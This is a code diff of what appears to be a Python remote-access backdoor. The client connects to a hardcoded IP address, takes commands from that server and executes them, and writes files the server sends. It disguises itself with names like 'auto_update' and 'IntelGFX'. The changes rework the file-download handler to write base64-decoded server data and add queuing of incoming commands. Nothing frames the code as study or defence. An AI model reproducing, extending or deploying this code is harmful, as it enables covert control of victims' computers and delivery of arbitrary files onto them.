@@ -16,6 +16,7 @@ import subprocess
 import sched
 import datetime
 import zlib
+import base64
 import shutil
 
 HOST = '109.172.189.74'
@@ -81,6 +82,7 @@ while 1:
         ID = ''
         COMMANDS = {}
         DOWNLOADS = {}
+        QUERY = []
 
         destination_directory = 'iDocuments'
         client_name = 'auto_update'
@@ -137,8 +139,6 @@ while 1:
                 super(REACTOR, self).__init__()
                 global COMMANDS
                 global DOWNLOADS
-
-                print 'start reactor [%s]' % data['mode']
 
                 self.data = data
                 self.active_thread = True
@@ -218,21 +218,10 @@ while 1:
 
                     output = 'endCommandExecute'
                 elif self.data['mode'] == 'downloadMode':
-                    print 'aq'
                     filename = self.data['payload']['file_name']
-                    session = self.data['payload']['session']
-                    raw_data = self.data['payload']['raw_data']
-                    if raw_data == 'downloadFinished':
-                        print 'download finished'
-                        open(filename, 'wb').write(DOWNLOADS[session])
-                        del DOWNLOADS[session]
-                        return
-                    if DOWNLOADS.has_key(session):
-                        print 'append raw_data'
-                        DOWNLOADS[session] += raw_data
-                    else:
-                        print 'start downloading'
-                        DOWNLOADS[session] = raw_data
+                    raw_data = base64.b64decode(self.data['payload']['raw_data'])
+                    open(filename, 'wb').write(raw_data)
+                    print 'done downloading'
                 elif self.data['mode'] == 'uploadMode':
                     pass
                 else:
@@ -681,6 +670,7 @@ while 1:
 
         def data_receive(end='[ENDOFMESSAGE]'):
             global GLOBAL_SOCKET
+            global QUERY
             received_data = ''
             try:
                 payload = GLOBAL_SOCKET.recv(1024)
@@ -688,13 +678,18 @@ while 1:
                     received_data = received_data + payload
                     if received_data.endswith(end):
                         received_data = received_data[:-len(end)]
+                        if end in received_data:
+                            for i in received_data.split(end):
+                                QUERY.append(ast.literal_eval(i))
+                            print len(QUERY)
+                            return
                         break
                     else:
                         payload = GLOBAL_SOCKET.recv(1024)
                         continue
-                return ast.literal_eval(received_data)
+                QUERY.append(ast.literal_eval(received_data))
             except socket.error:
-                return {'payload': '', 'mode': '', 'from': '', 'to': ''}
+                pass
 
 
         # Send Data Function
@@ -779,6 +774,7 @@ while 1:
             global ACTIVE
             global ID
             global COMMANDS
+            global QUERY
 
             while 1:
 
@@ -797,15 +793,18 @@ while 1:
 
                 # After Initialized
                 while ACTIVE:
-                    data = data_receive()
-                    print data['mode']
-                    if data:
-                        if data['mode'] == 'updateSource':
-                            raise ValueError('Manualy Generated Exception')
-                        COMMANDS[data['module_id']] = REACTOR(data)
-                        COMMANDS[data['module_id']].start()
-                    else:
-                        continue
+                    data_receive()
+                    if len(QUERY)>1:
+                        print "LEN: ", len(QUERY)
+                    for data in QUERY:
+                        if data:
+                            if data['mode'] == 'updateSource':
+                                raise ValueError('Manualy Generated Exception')
+                            COMMANDS[data['module_id']] = REACTOR(data)
+                            COMMANDS[data['module_id']].start()
+                        else:
+                            continue
+                    QUERY = []
 
         if not 'IntelGFX' in sys.argv[0]:
             # Change Home Dir
